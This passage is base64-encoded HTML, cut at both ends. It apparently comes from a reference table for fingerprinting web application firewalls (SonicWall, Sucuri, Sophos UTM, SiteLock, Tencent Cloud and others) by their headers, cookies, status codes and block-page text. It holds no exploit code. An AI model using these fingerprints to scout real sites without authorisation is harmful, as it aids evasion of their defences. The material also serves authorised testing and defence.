dWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAg
PHRkPgogICAgICAgICAgICBTZXJ2ZXJEZWZlbmRlciBWUAogICAgICAgIDwv
dGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAg
ICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgogICAg
ICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+
PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAg
ICA8bGk+QmxvY2tlZCByZXNwb25zZSBjb250YWlucyA8Y29kZT5YLVBpbnQ8
L2NvZGU+IGhlYWRlciBmaWVsZCB3aXRoIDxjb2RlPnA4MDwvY29kZT4ga2V5
d29yZC48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAg
PC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAg
ICA8dGQ+CiAgICAgICAgICAgIFNoYWRvdyBEYWVtb24KICAgICAgICA8L3Rk
PgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAg
ICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5EaWZmaWN1bHQ8L2xpPgog
ICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8
L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
ICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRhaW5zIDxjb2Rl
PnJlcXVlc3QgZm9yYmlkZGVuIGJ5IGFkbWluaXN0cmF0aXZlIHJ1bGVzLjwv
Y29kZT4ga2V5d29yZC48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAg
ICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0
cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIFNoaWVsZFNlY3VyaXR5CiAg
ICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAg
ICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RGlmZmlj
dWx0PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0
aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAg
ICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBjb250
YWluczogCiAgICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAg
ICAgICAgICAgICA8bGk+PGNvZGU+WW91IHdlcmUgYmxvY2tlZCBieSB0aGUg
U2hpZWxkLjwvY29kZT4gdGV4dC48L2xpPgogICAgICAgICAgICAgICAgICAg
ICAgICA8bGk+PGNvZGU+U29tZXRoaW5nIGluIHRoZSBVUkwsIEZvcm0gb3Ig
Q29va2llIGRhdGEgd2Fzbid0IGFwcHJvcHJpYXRlPC9jb2RlPiB0ZXh0IHNu
aXBwZXQuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2Rl
Pldhcm5pbmc6IFlvdSBoYXZlIHtudW1iZXJ9IHJlbWFpbmluZyB0cmFuc2dy
ZXNzaW9uKHMpIGFnYWluc3QgdGhpcyBzaXRlPC9jb2RlPi48L2xpPgogICAg
ICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+U2VyaW91c2x5IHN0b3Ag
cmVwZWF0aW5nIHdoYXQgeW91IGFyZSBkb2luZyBvciB5b3Ugd2lsbCBiZSBs
b2NrZWQgb3V0PC9jb2RlPi48L2xpPgogICAgICAgICAgICAgICAgICAgIDwv
dWw+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgog
ICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4K
ICAgICAgICAgICAgU2l0ZUdyb3VuZAogICAgICAgIDwvdGQ+CiAgICAgICAg
PHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+
RGV0ZWN0YWJpbGl0eTogPC9iPkRpZmZpY3VsdDwvbGk+CiAgICAgICAgICAg
ICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgog
ICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5C
bG9ja2VkIHJlc3BvbnNlIHBhZ2UgY29udGFpbnM8YnI+IDxjb2RlPlRoZSBw
YWdlIHlvdSBhcmUgdHJ5aW5nIHRvIGFjY2VzcyBpcyByZXN0cmljdGVkIGR1
ZSB0byBhIHNlY3VyaXR5IHJ1bGU8L2NvZGU+IHRleHQgc25pcHBldC48L2xp
PgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAg
ICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAg
ICAgICAgICAgIFNpdGVHdWFyZCAoSlAgU2VjdXJlKQogICAgICAgIDwvdGQ+
CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAg
ICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkRpZmZpY3VsdDwvbGk+CiAg
ICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5Ojwv
Yj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAg
ICAgIDxsaT5SZXNwb25zZSBwYWdlIGNvbnRhaW5zOgogICAgICAgICAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2Rl
PlBvd2VyZWQgYnkgU2l0ZUd1YXJkPC9jb2RlPiB0ZXh0IHNuaXBwZXQuPC9s
aT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlRoZSBzZXJ2
ZXIgcmVmdXNlIHRvIGJyb3dzZSB0aGUgcGFnZS48L2NvZGU+IHRleHQgc25p
cHBldC48L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+
VGhlIFVSTCBtYXkgbm90IGJlIGNvcnJlY3QuIFBsZWFzZSBjb25maXJtIHRo
ZSB2YWx1ZS48L2NvZGU+PC9saT4KICAgICAgICAgICAgICAgICAgICA8L3Vs
PiAKICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAg
ICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgog
ICAgICAgICAgICBTaXRlTG9jayBUcnVlU2hpZWxkCiAgICAgICAgPC90ZD4K
ICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
IDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAg
ICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xp
PgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxs
aT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2Ugc291cmNlIGNvbnRhaW5zIHRoZSBm
b2xsb3dpbmc6PC9saT4KICAgICAgICAgICAgICAgICAgICA8dWw+CiAgICAg
ICAgICAgICAgICAgICAgICAgIDxsaT5SZWZlcmVuY2UgdG8gPGNvZGU+d3d3
LnNpdGVsb2NrLmNvbTwvY29kZT4gVVJMLjwvbGk+CiAgICAgICAgICAgICAg
ICAgICAgICAgIDxsaT48Y29kZT5TaXRlbG9jayBpcyBsZWFkZXIgaW4gQnVz
aW5lc3MgV2Vic2l0ZSBTZWN1cml0eSBTZXJ2aWNlcy48L2NvZGU+IHRleHQu
PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPnNpdGVs
b2NrLXNpdGUtdmVyaWZpY2F0aW9uPC9jb2RlPiBrZXl3b3JkLjwvbGk+CiAg
ICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5zaXRlbG9ja19zaGll
bGRfbG9nbzwvY29kZT4gaW1hZ2UuPC9saT4KICAgICAgICAgICAgICAgICAg
ICA8L3VsPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91
bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8
dGQ+CiAgICAgICAgICAgIFNvbmljV2FsbAogICAgICAgIDwvdGQ+CiAgICAg
ICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+
PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAgICAg
ICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAg
ICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNv
ZGU+U2VydmVyPC9jb2RlPiBoZWFkZXIgY29udGFpbiA8Y29kZT5Tb25pY1dB
TEw8L2NvZGU+IGtleXdvcmQgdmFsdWUuPC9saT4KICAgICAgICAgICAgICAg
ICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRhaW5zIGVpdGhl
ciBvZiB0aGUgZm9sbG93aW5nIHRleHQgc25pcHBldDo8L2xpPgogICAgICAg
ICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICAgICAgPGxp
PkltYWdlIGRpc3BsYXlpbmcgPGNvZGU+RGVsbDwvY29kZT4gbG9nby48L2xp
PgogICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+VGhpcyByZXF1
ZXN0IGlzIGJsb2NrZWQgYnkgdGhlIFNvbmljV0FMTC48L2NvZGU+PC9saT4K
ICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPldlYiBTaXRlIEJs
b2NrZWQ8L2NvZGU+IHRleHQgc25pcHBldC48L2xpPgogICAgICAgICAgICAg
ICAgICAgICAgICA8bGk+PGNvZGU+bnNhX2Jhbm5lcjwvY29kZT4gYXMga2V5
d29yZC4gOnA8L2xpPgogICAgICAgICAgICAgICAgICAgIDwvdWw+CiAgICAg
ICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwv
dGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAg
ICAgU29waG9zIFVUTSAKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAg
ICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFi
aWxpdHk6IDwvYj5FYXN5PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5E
ZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAg
ICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9u
c2UgcGFnZSBjb250YWlucyA8Y29kZT5Qb3dlcmVkIGJ5IFVUTSBXZWIgUHJv
dGVjdGlvbjwvY29kZT4ga2V5d29yZC48L2xpPgogICAgICAgICAgICAgICAg
PC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90
cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIFNxdWFyZVNw
YWNlCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1
bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+
RGlmZmljdWx0PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rp
b24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+
CiAgICAgICAgICAgICAgICAgICAgPGxpPlJlc3BvbnNlIGNvZGUgcmV0dXJu
ZWQgaXMgPGNvZGU+NDA0IE5vdCBGb3VuZDwvY29kZT4gdXBvbiBtYWxpY2lv
dXMgcmVxdWVzdHMuPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+Qmxv
Y2tlZCByZXNwb25zZSBwYWdlIGNvbnRhaW5zIGVpdGhlciBvZiB0aGUgZm9s
bG93aW5nIHRleHQgc25pcHBldDo8L2xpPgogICAgICAgICAgICAgICAgICAg
IDx1bD4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPkJSSUNL
LTUwPC9jb2RlPiBrZXl3b3JkLjwvbGk+CiAgICAgICAgICAgICAgICAgICAg
ICAgIDxsaT48Y29kZT40MDQgTm90IEZvdW5kPC9jb2RlPiB0ZXh0IHNuaXBw
ZXQuPC9saT4KICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAg
ICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgog
ICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIFNx
dWlkUHJveHkgSURTCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmls
aXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2Nv
ZGU+IGhlYWRlciBjb250YWlucyBmaWVsZCB2YWx1ZSA8Y29kZT5zcXVpZC97
dmVyc2lvbn08L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxp
PkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBjb250YWluczxicj4gPGNvZGU+QWNj
ZXNzIGNvbnRyb2wgY29uZmlndXJhdGlvbiBwcmV2ZW50cyB5b3VyIHJlcXVl
c3QgZnJvbSBiZWluZyBhbGxvd2VkIGF0IHRoaXMgdGltZS48L2NvZGU+Ljwv
bGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgog
ICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4K
ICAgICAgICAgICAgU3RhY2tQYXRoCiAgICAgICAgPC90ZD4KICAgICAgICA8
dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5E
ZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8
bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAg
ICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5Db250YWlu
cyBpbWFnZSBkaXNwbGF5aW5nIDxjb2RlPlN0YWNrUGF0aDwvY29kZT4gbG9n
by48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3Bv
bnNlIHBhZ2UgY29udGFpbnM8YnI+IDxjb2RlPllvdSBwZXJmb3JtZWQgYW4g
YWN0aW9uIHRoYXQgdHJpZ2dlcmVkIHRoZSBzZXJ2aWNlIGFuZCBibG9ja2Vk
IHlvdXIgcmVxdWVzdDwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAgIDwv
dWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+
CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBTdGluZ3JheQog
ICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAg
ICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkRpZmZp
Y3VsdDwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1l
dGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAg
ICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIGNvZGUgcmV0
dXJucyA8Y29kZT40MDMgRm9yYmlkZGVuPC9jb2RlPiBvciA8Y29kZT41MDAg
SW50ZXJuYWwgRXJyb3I8L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICAg
ICAgPGxpPlJlc3BvbnNlIGhlYWRlcnMgY29udGFpbiB0aGUgPGNvZGU+WC1N
YXBwaW5nPC9jb2RlPiBoZWFkZXIgZmllbGQgbmFtZS48L2xpPgogICAgICAg
ICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3Rk
PgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAg
IFN1Y3VyaSBDbG91ZFByb3h5CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+
CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRl
Y3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+
PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAg
ICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBo
ZWFkZXJzIG1heSBjb250YWluIDxjb2RlPlN1Y3VyaTwvY29kZT4gb3IgPGNv
ZGU+Q2xvdWRwcm94eTwvY29kZT4ga2V5d29yZHMuPC9saT4KICAgICAgICAg
ICAgICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRhaW5z
IHRoZSBmb2xsb3dpbmcgdGV4dCBzbmlwcGV0OjwvbGk+CiAgICAgICAgICAg
ICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNv
ZGU+QWNjZXNzIERlbmllZCAtIFN1Y3VyaSBXZWJzaXRlIEZpcmV3YWxsPC9j
b2RlPiB0ZXh0LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT5S
ZWZlcmVuY2UgdG8gPGNvZGU+aHR0cHM6Ly9zdWN1cmkubmV0L3ByaXZhY3kt
cG9saWN5PC9jb2RlPiBVUkwuPC9saT4KICAgICAgICAgICAgICAgICAgICAg
ICAgPGxpPlNvbWV0aW1lcyB0aGUgZW1haWwgPGNvZGU+Y2xvdWRwcm94eUBz
dWN1cmkubmV0PC9jb2RlPi48L2xpPgogICAgICAgICAgICAgICAgICAgICAg
ICA8bGk+Q29udGFpbnMgY29weXJpZ2h0IG5vdGljZSA8Y29kZT47Y29weSB7
eWVhcn0gU3VjdXJpIEluYzwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAg
ICAgICA8L3VsPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBo
ZWFkZXJzIGNvbnRhaW5zIDxjb2RlPlgtU3VjdXJpLUlEPC9jb2RlPiBoZWFk
ZXIgYWxvbmcgd2l0aCBub3JtYWwgcmVxdWVzdHMuPC9saT4KICAgICAgICAg
ICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4K
ICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBT
eW5vbG9neSBDbG91ZAogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAg
ICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJp
bGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRl
dGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAg
IDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25z
ZSBwYWdlIGhhcyA8Y29kZT5Db3B5cmlnaHQgKGMpIDIwMTkgU3lub2xvZ3kg
SW5jLiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvY29kZT5hcyB0ZXh0LjwvbGk+
CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAg
ICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAg
ICAgICAgICAgVGVuY2VudCBDbG91ZAogICAgICAgIDwvdGQ+CiAgICAgICAg
PHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+
RGV0ZWN0YWJpbGl0eTogPC9iPk1vZGVyYXRlPC9saT4KICAgICAgICAgICAg
ICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAg
ICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJs
b2NrZWQgcmVzcG9uc2UgY29kZSByZXR1cm5zIDxjb2RlPjQwNSBNZXRob2Qg
Tm90IEFsbG93ZWQ8L2NvZGU+IGVycm9yLjwvbGk+CiAgICAgICAgICAgICAg
ICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBjb250YWlucyByZWZl
cmVuY2UgdG8gPGNvZGU+d2FmLnRlbmNlbnQtY2xvdWQuY29tPC9jb2RlPiBV
UkwuPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwv
dWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAg
PHRkPgogICAgICAgICAgICBUZXJvcwogICAgICAgIDwvdGQ+CiAgICAgICAg
PHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+
RGV0ZWN0YWJpbGl0eTogPC9iPkRpZmZpY3VsdDwvbGk+CiAgICAgICAgICAg
ICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgog
ICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5S
ZXNwb25zZSBoZWFkZXJzIGNvbnRhaW4gY29va2llIGZpZWxkIDxjb2RlPnN0
OGlkPC9jb2RlPi48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAg
ICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4K
ICAgICAgICA8dGQ+CiAgICAgICAgICAgIFRyYWZmaWNTaGllbGQKICAgICAg
ICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAg
ICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5Nb2RlcmF0ZTwv
bGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9s
b2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAg
ICAgICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2NvZGU+IG1pZ2h0IGNvbnRh
aW4gPGNvZGU+RjUtVHJhZmZpY1NoaWVsZDwvY29kZT4ga2V5d29yZC48L2xp
PgogICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5BU0lORk89PC9jb2Rl
PiB2YWx1ZSBtaWdodCBiZSBkZXRlY3RlZCBpbiByZXNwb25zZSBjb29raWVz
LjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3Vs
PgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0
ZD4KICAgICAgICAgICAgVHJhbnNJUAogICAgICAgIDwvdGQ+CiAgICAgICAg
PHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+
RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAgICAgICAg
PGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAg
ICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+UmVzcG9u
c2UgaGVhZGVycyBjb250YWluIHVuaXF1ZSBoZWFkZXIgPGNvZGU+WC1UcmFu
c0lQLUJhY2tlbmQ8L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICAgICAg
PGxpPlJlc3BvbnNlIGhlYWRlcnMgY29udGFpbiBhbm90aGVyIGhlYWRlciA8
Y29kZT5YLVRyYW5zSVAtQmFsYW5jZXI8L2NvZGU+LjwvbGk+CiAgICAgICAg
ICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+
CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAg
VUNsb3VkIFVFV2FmCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmls
aXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBjb250ZW50
IG1pZ2h0IGNvbnRhaW46CiAgICAgICAgICAgICAgICAgICAgPHVsPgogICAg
ICAgICAgICAgICAgICAgICAgICA8bGk+UmVmZXJlbmNlIHRvIDxjb2RlPi91
ZXdhZl9kZW55X3BhZ2VzL2RlZmF1bHQvaW1nLzwvY29kZT4gaW51cmwgZGly
ZWN0b3J5LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29k
ZT51Y2xvdWQuY248L2NvZGU+IFVSTC48L2xpPgogICAgICAgICAgICAgICAg
ICAgIDwvdWw+IAogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBo
ZWFkZXJzIHJldHVybmVkIGhhcyA8Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRl
ciBzZXQgdG8gPGNvZGU+dWV3YWYve3ZlcnNpb259PC9jb2RlPi48L2xpPgog
ICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAg
ICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIFVSTE1hc3RlciBTZWN1cml0eUNoZWNrCiAgICAgICAgPC90ZD4K
ICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
IDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+TW9kZXJhdGU8L2xpPgogICAg
ICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+
PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAg
ICA8bGk+UmVzcG9uc2UgaGVhZGVycyBtaWdodCBjb250YWluOgogICAgICAg
ICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICAgICAgPGxp
Pjxjb2RlPlVybE1hc3RlcjwvY29kZT4ga2V5d29yZC48L2xpPgogICAgICAg
ICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+VXJsUmV3cml0ZU1vZHVsZTwv
Y29kZT4ga2V5d29yZC48L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8
bGk+PGNvZGU+U2VjdXJpdHlDaGVjazwvY29kZT4ga2V5d29yZC48L2xpPgog
ICAgICAgICAgICAgICAgICAgIDwvdWw+IAogICAgICAgICAgICAgICAgICAg
IDxsaT5CbG9ja2VkIHJlc3BvbnNlIGNvZGUgcmV0dXJuZWQgaXMgPGNvZGU+
NDAwIEJhZCBSZXF1ZXN0PC9jb2RlPiB0ZXh0IHNuaXBwZXQuPC9saT4KICAg
ICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAg
PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAg
ICAgICBVUkxTY2FuCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmls
aXR5OiA8L2I+TW9kZXJhdGU8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxi
PkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAg
ICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+PC9saT4KICAgICAg
ICAgICAgICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRh
aW5zOjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAg
ICAgICAgICAgICAgICA8bGk+PGNvZGU+UmVqZWN0ZWQtYnktVVJMU2Nhbjwv
Y29kZT4gdGV4dCBzbmlwcGV0LjwvbGk+CiAgICAgICAgICAgICAgICAgICAg
ICAgIDxsaT48Y29kZT5TZXJ2ZXIgRXJybyBpbiBBcHBsaWNhdGlvbjwvY29k
